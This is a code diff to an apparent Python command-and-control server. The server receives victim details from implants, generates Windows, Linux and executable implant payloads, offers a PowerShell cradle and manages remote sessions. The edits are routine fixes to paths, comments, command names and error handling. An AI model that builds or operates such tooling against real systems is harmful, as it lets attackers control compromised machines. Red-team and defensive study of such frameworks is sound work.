@@ -11,8 +11,8 @@ import threading
 import time
 from datetime import datetime
 from prettytable import PrettyTable
-from Config.design import *
-from Config.commands import *
+from config.design import *
+from config.commands import *
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
@@ -162,13 +162,17 @@ def comm_handler():
 
             # Get info from implant
             username = remote_target.recv(1024).decode()  # - 1
-            username = base64.b64decode(username).decode()  # encoding
+            username = base64.b64decode(username).decode()  # decoding
 
             admin = remote_target.recv(1024).decode()  # - 2
-            admin = base64.b64decode(admin).decode()  # encoding
+            admin = base64.b64decode(admin).decode()  # decoding
 
             op_sys = remote_target.recv(4096).decode()  # - 3
-            op_sys = base64.b64decode(op_sys).decode()  # encoding
+            op_sys = base64.b64decode(op_sys).decode()  # decoding
+
+            # Check if username is populated, if not send NULL
+            if username == "".strip():
+                username = "NULL"
 
             # Check if user is admin
             # Windows
@@ -202,8 +206,8 @@ def comm_handler():
                                 ])
 
                 print(
-                    f'{Fore.GREEN}\n[+] Connection Received from {host_name[0]}@{remote_ip}\n{Style.RESET_ALL}{Fore.YELLOW}'
-                    + f'{host_name}@{remote_ip}'
+                    f'{Fore.GREEN}\n[+] Connection Received from {host_name[0]} {remote_ip}\n{Style.RESET_ALL}{Fore.YELLOW}'
+                    + f'{host_name}:{remote_ip}'
                     + Style.RESET_ALL,
                     end='',
                 )
@@ -237,8 +241,8 @@ def winplant():
     file_name = f'{ran_name}.py'
     generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists(r'Implants\winplant.py'):
-        shutil.copy('Implants/winplant.py', generated)
+    if os.path.exists(r'implants\winplant.py'):
+        shutil.copy('implants/winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
@@ -273,8 +277,8 @@ def linplant():
     file_name = f'{ran_name}.py'
     generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists('Implants/linplant.py'):
-        shutil.copy('Implants/linplant.py', generated)
+    if os.path.exists('implants/linplant.py'):
+        shutil.copy('implants/linplant.py', generated)
     else:
         error("File Not Found - linplant.py")
 
@@ -310,8 +314,8 @@ def exeplant():
     exe_file = f'{ran_name}.exe'
     generated = f'Generated Payloads/{file_name}'
 
-    if os.path.exists('Implants/winplant.py'):
-        shutil.copy('Implants/winplant.py', generated)
+    if os.path.exists('implants/winplant.py'):
+        shutil.copy('implants/winplant.py', generated)
     else:
         error("File Not Found - winplant.py")
 
@@ -427,19 +431,19 @@ if __name__ == "__main__":
 
                 case ('pshell_shell'):
                     pshell_cradle()
-                case 'winplant.py':
+                case 'winpy':
                     if listener_counter > 0:
                         winplant()
                     else:
                         error("Generate Listener First")
 
-                case 'linplant.py':
+                case 'linpy':
                     if listener_counter > 0:
                         linplant()
                     else:
                         error("Generate Listener First")
 
-                case 'exeplant.py':
+                case 'exepy':
                     if listener_counter > 0:
                         exeplant()
                     else:
@@ -515,6 +519,9 @@ if __name__ == "__main__":
                             error("The Dead Don't Talk - Cannot communicate with agent")
                     except IndexError:
                         error(f"Session {num} does not exist")
+                    except NameError:
+                        print("Please enter a number")
+                        pass
 
                 # Kill Session
                 if command.split(" ")[1].strip() in ['-k', '--kill']:
@@ -556,4 +563,6 @@ if __name__ == "__main__":
             quit("Quitting...")
             break
         except ConnectionAbortedError:
+            break
+        except ConnectionResetError:
             break
